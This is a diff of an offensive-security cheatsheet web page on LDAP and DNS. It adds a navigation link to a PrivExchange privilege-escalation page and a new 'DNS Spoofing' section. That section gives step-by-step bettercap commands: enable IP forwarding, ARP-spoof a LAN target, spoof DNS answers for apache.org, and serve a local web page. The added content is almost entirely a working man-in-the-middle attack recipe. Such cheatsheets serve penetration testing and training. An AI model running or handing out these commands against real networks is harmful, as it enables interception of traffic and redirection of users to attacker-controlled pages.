@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:26 CET">
+<meta name="revised" content="2019-11-10T13:28:48 CET">
 <title>LDAP &amp; DNS :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1020,6 +1020,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1430,6 +1437,32 @@ nslookup -type<span style="color:#f92672">=</span>any
                 <span style="color:#111">$rr</span><span style="color:#f92672">-&gt;</span><span style="color:#00a8c8">print</span><span style="color:#111">;</span>
         <span style="color:#111">}</span>
 <span style="color:#111">}</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="dns-spoofing">DNS Spoofing</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using bettercap</span>
+<span style="color:#75715e"># In a local network, you can DNS queries using ARP spoofing</span>
+
+<span style="color:#75715e"># Activate router mode on attacker machine</span>
+<span style="color:#111">echo</span> <span style="color:#ae81ff">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+
+<span style="color:#75715e"># Show machines in the LAN</span>
+&gt; net.show
+
+<span style="color:#75715e"># Set target for ARP spoofing</span>
+&gt; <span style="color:#111">set</span> arp.spoof.targets <span style="color:#ae81ff">192</span>.168.5.99
+
+<span style="color:#75715e"># Launch attack</span>
+&gt; arp.spoof on
+
+<span style="color:#75715e"># Set domain to spoof, spoof.all allow to also consider external requests and not only local ones</span>
+&gt; <span style="color:#111">set</span> dns.spoof.domains apache.org
+&gt; <span style="color:#111">set</span> dns.spoof.all <span style="color:#111">true</span>
+&gt; dns.spoof on
+
+<span style="color:#75715e"># You can then create a local web server</span>
+&gt; <span style="color:#111">set</span> http.server.path /var/www/html
+&gt; http.server on</code></pre></div>
 
     
     
